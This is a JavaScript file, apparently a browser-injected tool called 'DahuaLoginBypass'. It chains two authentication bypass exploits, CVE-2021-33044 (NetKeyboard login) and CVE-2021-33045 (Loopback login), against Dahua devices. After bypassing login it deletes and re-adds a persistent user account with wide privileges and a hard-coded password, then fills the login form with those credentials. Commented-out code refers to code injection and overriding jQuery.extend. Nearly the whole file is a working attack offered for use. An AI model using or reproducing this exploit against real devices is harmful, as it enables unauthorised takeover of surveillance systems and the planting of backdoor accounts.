
let url = 'cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(un)
	+ '&user.Password=' + encodeURIComponent(pw)
	+ '&user.Group=admin'
	+ '&user.Sharable=true'
	+ '&user.Memo=' + encodeURIComponent('Added by DahuaLoginBypass')
	+ '&user.Reserved=false'
	+ '&session=' + encodeURIComponent(session);
let args = {
	method: 'GET'
};
fetch(url, args)
	.then(response => response.json())
	.then(data =>
	{
		console.log("addUser result", data);
		if (data.result)
		{
			return { un, pw };
		}
		else
			return Promise.reject(data);
	});















//let saveThis = this;
//let waitForButtonPress = setInterval(() =>
//{
//	let btn = document.getElementById("dlb_test");
//	if (!btn)
//		return;

//	console.log("code injection B", document.getElementById("dlb_test").getAttribute('wasclicked'), document.getElementById("dlb_test").test_field);
//	let jQuery = btn.jQuery;
//	if (!jQuery)
//		return;

//	console.log("code injection complete");

//	clearInterval(waitForButtonPress);

//	let originalExtend = jQuery.extend;
//	jQuery.extend = () =>
//	{
//		console.log("extend override", arguments);
//		originalExtend.apply(saveThis, arguments);
//	}


//}, 2000);










function setCookie(name, value, days)
{
	var expires = "";
	if (days)
	{
		var date = new Date();
		date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
		expires = "; expires=" + date.toUTCString();
	}
	document.cookie = name + "=" + (value || "") + expires + "; path=/";
}
function getCookie(name)
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++)
	{
		var c = ca[i];
		while (c.charAt(0) == ' ') c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
	}
	return null;
}
function eraseCookie(name)
{
	document.cookie = name + '=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
}








////////////////////////////////////////////////////
// Try creating a user to log in with.
////////////////////////////////////////////////////
// Unfortunately the API we can use to create a user 
// actually creates an invalid user that can't be used.
// :(

let rpcid = 1;
function RPC(url, method, params, session)
{
	let rpcArg = {
		method,
		params,
		id: rpcid++,
		session
	};

	let args = {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
		},
		body: JSON.stringify(rpcArg)
	};
	return fetch(url, args)
		.then(response => response.json())
		.then(data =>
		{
			console.log(method + " result", data);
			return data;
		})
		;
}

const pwChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*_-+=";
function generatePassword(length)
{
	let password = "";
	for (let i = 0; i < length; i++)
	{
		password += pwChars.charAt(
			Math.floor(Math.random() * pwChars.length)
		);
	}
	return password;
}

function loginCVE_2021_33044()
{
	var arg = { "userName": "admin", "password": "Not Used", "clientType": "NetKeyboard", "loginType": "Direct", "authorityType": "Default" };
	return RPC("RPC2_Login", "global.login", arg, 0)
		.then(data =>
		{
			if (data.result)
			{
				return addUser(data.session)
					.then(acct =>
					{
						executeLogin(acct.un, acct.pw);
						return Promise.resolve("");
					})
					.catch(err =>
					{
						console.error(err);
						return Promise.reject("Failed to add a new user.");
					});
			}
			else
				return Promise.reject("Unable to log in with NetKeyboard method");
		});
}
let myUserName = "dh3";
function addUser(session)
{
	let un = myUserName;
	let pw = '12345Abc$';//generatePassword(16);

	let newUser = {
		"Anonymous": false,
		"Name": un,
		"Type": "",
		"ModifiedTime": "",
		"Memo": "",
		"Group": "user",
		"AuthorityList": [
			"AuthUserMag",
			"Monitor_01",
			"Replay_01",
			"AuthSysCfg",
			"AuthSysInfo",
			"AuthBackup",
			"AuthStoreCfg",
			"AuthEventCfg",
			"AuthNetCfg",
			"AuthPeripheral",
			"AuthAVParam",
			"AuthSecurity",
			"AuthMaintence"
		],
		"Reserved": false,
		"Sharable": true,
		"Password": pw
	};

	return getGroupInfoAll(session)
		.then(data =>
		{
			// Get authority list from admin group if possible, otherwise fall back to hard-coded list.
			let adminGroup = null;
			for (let i = 0; i < data.params.length; i++)
			{
				if (data.params[i].Name === "user")
					adminGroup = data.params[i];
			}
			if (!adminGroup && data.params.length > 0)
				adminGroup = data.params[0];
			if (adminGroup)
				newUser.AuthorityList = adminGroup.AuthorityList;
			newUser.AuthorityList.sort();

			return deleteUser(session)
				.then(() =>
				{
					return RPC("RPC2", "userManager.addUser", { user: newUser }, session)
						.then(data =>
						{
							if (data.result)
								return Promise.resolve({ un, pw });
							else
								return Promise.reject(data);
						});
				});
		})

}

function deleteUser(session)
{
	return RPC("RPC2", "userManager.deleteUser", { name: myUserName }, session);
}
function getGroupInfoAll(session)
{
	return RPC("RPC2", "userManager.getGroupInfoAll", null, session);
}

function executeLogin(un, pw)
{
	document.getElementById("login_user").value = un;
	document.getElementById("login_psw").value = pw;
	//document.querySelector('a[btn-for="onLogin"]').click();
}



//console.log("Attempting CVE-2021-33044 Login");

loginCVE_2021_33044()
	.then(result =>
	{
		if (result)
		{
			alert(result);
			console.log("Failed to log in using CVE-2021-33044");
		}
	})
	.catch(err1 =>
	{
		alert(err1);
		console.log("Failed to log in using CVE-2021-33044");
		console.log("Attempting CVE-2021-33045 Login");

		loginCVE_2021_33045()
			.then(result =>
			{
				if (result)
				{
					alert(result);
					console.log("Failed to log in using CVE-2021-33045");
				}
			})
			.catch(err2 =>
			{
				alert(err2);
				console.log("Failed to log in using CVE-2021-33045");
			});


	});


function loginCVE_2021_33045()
{
	var arg = {
		"userName": "admin",
		"ipAddr": "127.0.0.1",
		"loginType": "Loopback",
		"clientType": "Local",
		"authorityType": "Default",
		"passwordType": "Plain",
		"password": "admin"
	};
	return RPC("RPC2_Login", "global.login", arg, 0)
		.then(data =>
		{
			if (data.result)
			{
				return addUser(data.session)
					.then(acct =>
					{
						executeLogin(acct.un, acct.pw);
						return Promise.resolve("");
					})
					.catch(err =>
					{
						console.error(err);
						return Promise.reject("Failed to add a new user.");
					});
			}
			else
				return Promise.reject("Unable to log in with Loopback method");
		});
}

